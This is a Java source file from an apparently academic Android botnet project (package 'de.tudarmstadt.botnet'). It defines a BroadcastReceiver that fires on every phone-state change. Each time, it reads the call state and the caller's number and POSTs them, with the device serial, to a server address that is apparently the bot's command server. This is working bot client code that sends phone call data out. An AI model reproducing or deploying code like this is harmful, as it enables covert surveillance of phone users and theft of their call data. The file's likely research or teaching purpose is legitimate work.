package de.tudarmstadt.botnet.janus_yanai;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class PhoneReceiver extends BroadcastReceiver {

	private final static String TAG = "PhoneReceiver";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.v(TAG, intent.toString());
		
		String es = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
		String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER); 
		
		String resstate;
		
		     if (es.equals(TelephonyManager.EXTRA_STATE_IDLE)) { resstate = "idle"; }
		else if (es.equals(TelephonyManager.EXTRA_STATE_RINGING)) { resstate = "ringing"; }
		else if (es.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { resstate = "offhook"; }
		else    { return; }
		     
	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://" + BotClientActivity.getIP(context) + "/phone");

	    try {
	        // Add your data
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
	        nameValuePairs.add(new BasicNameValuePair("serial", Config.getID(context)));
	        nameValuePairs.add(new BasicNameValuePair("state", resstate));
	        if (resstate.equals("offhook") || resstate.equals("ringing")) nameValuePairs.add(new BasicNameValuePair("number", phoneNumber));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	        
	        // Execute HTTP Post Request
	        HttpResponse response = httpclient.execute(httppost);
	        Toast.makeText(context, new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next(), Toast.LENGTH_LONG).show();
	    } catch (Exception e) {
	    	Toast.makeText(context, e.getMessage(), Toast.LENGTH_LONG).show();
	    }
	}
	
}
